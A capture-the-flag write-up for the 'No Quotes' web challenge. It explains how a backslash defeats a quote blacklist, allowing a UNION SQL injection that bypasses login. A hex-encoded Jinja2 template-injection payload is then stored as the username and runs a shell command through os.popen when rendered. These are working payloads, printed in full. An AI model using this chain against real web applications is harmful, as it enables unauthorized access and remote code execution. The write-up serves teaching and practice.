#### No Quotes
- points earned: 37
#### Notes / Intuition
- For the `POST /login` endpoint parameterized queries are NOT used which means there is potential for sql injection.
- The `waf` function prevents `'` and `"` characters from both `username` and `password`.
	```python
	def waf(value: str) -> bool:
		blacklist = ["'", '"']
		return any(char in value for char in blacklist)
	```
- A `\` character at the end of the username can be used to escape the 2nd quote which means that `password` will be interpreted as sql.
	- `SELECT id, username FROM users WHERE username = ('meow') AND password = ('bark')`
	- becomes
	- `SELECT id, username FROM users WHERE username = ('meow\') AND password = ('bark')`
	- which checks that `username='meow\') AND password = ('`
	- Since `bark` is not a valid sql keyword the command will fail.
	- username `meow\` and password `) union select 1,2#` can be used to create a valid sql statement that bypasses authentication.
- the `GET /home` endpoint places user input into the template before rendering which means it is potentially vulnerable to SSTI
	- `render_template_string(open("templates/home.html").read() % session["user"])`
- So if the username is something like `{{4*4}}` then it will be evaluated and rendered as `16`
- The query is `SELECT id, username from ...` so the result of the sql injection must contain a first row with and id and a username that triggers the SSTI.
- The Jinja2 SSTI payload below can execute `/readflag` which reads the flag file.
	```python
	{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}
	```
- Since quotes cannot be used, this SSTI payload must be encoded to bypass the quote filter.  This can be accomplished by abusing the fact that strings can be encoded in hex in an sql statement.
	- for example `0x6d656f77` is interpretted as `'meow'`


#### Solution
- Send a POST with the data below to `/login`
```
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e28272f72656164666c616727292e7265616428297d7d#
```
- For reference, the raw payload looks like
```
username=asd\&password=) union select 1, "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"#
```
- This passes authentication and provides a cookie.
- Using this cookie to access `/home` renders the flag where the username should be.